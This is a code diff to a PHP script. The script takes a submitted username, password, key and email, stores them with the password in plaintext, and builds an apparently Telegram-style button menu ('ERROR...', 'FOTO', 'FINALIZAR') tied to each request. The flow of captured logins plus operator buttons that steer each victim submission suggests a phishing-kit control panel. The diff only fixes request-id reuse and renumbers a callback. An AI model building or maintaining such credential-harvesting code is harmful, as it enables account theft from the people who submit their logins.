@@ -9,10 +9,19 @@ $nombreUsuario = $_POST['usuario'] ?? '';
 $password      = $_POST['clave']   ?? '';
 $claveUnica    = $_POST['key']     ?? '';
 $email         = $_POST['correo']  ?? '';
-$idPeticion    = uniqid("req_");
 
 if (trim($claveUnica) === '') {
     $claveUnica = 'auto_' . bin2hex(random_bytes(16));
+}
+
+$sel = $pdo->prepare("SELECT request_id, correo, estado FROM solicitudes WHERE `key` = ? LIMIT 1");
+$sel->execute([$claveUnica]);
+$existente = $sel->fetch(PDO::FETCH_ASSOC);
+
+if ($existente && !empty($existente['request_id'])) {
+    $idPeticion = (string)$existente['request_id'];
+} else {
+    $idPeticion = uniqid("req_");
 }
 
 $upsert = $pdo->prepare(
@@ -21,7 +30,7 @@ $upsert = $pdo->prepare(
      ON DUPLICATE KEY UPDATE
          `user`       = VALUES(`user`),
          `password`   = VALUES(`password`),
-         `request_id` = VALUES(`request_id`),
+         `request_id` = IFNULL(VALUES(`request_id`), `request_id`),
          `correo`     = IFNULL(VALUES(`correo`), `correo`)"
 );
 $upsert->execute([
@@ -69,7 +78,7 @@ $teclado = [
     ['text' => "ERROR...",  'callback_data' => "OPCION_4_$idPeticion"],
     ['text' => "FOTO",      'callback_data' => "OPCION_5_$idPeticion"],
   ], [
-    ['text' => "FINALIZAR", 'callback_data' => "OPCION_9_$idPeticion"]
+    ['text' => "FINALIZAR", 'callback_data' => "OPCION_10_$idPeticion"]
   ]]
 ];
 
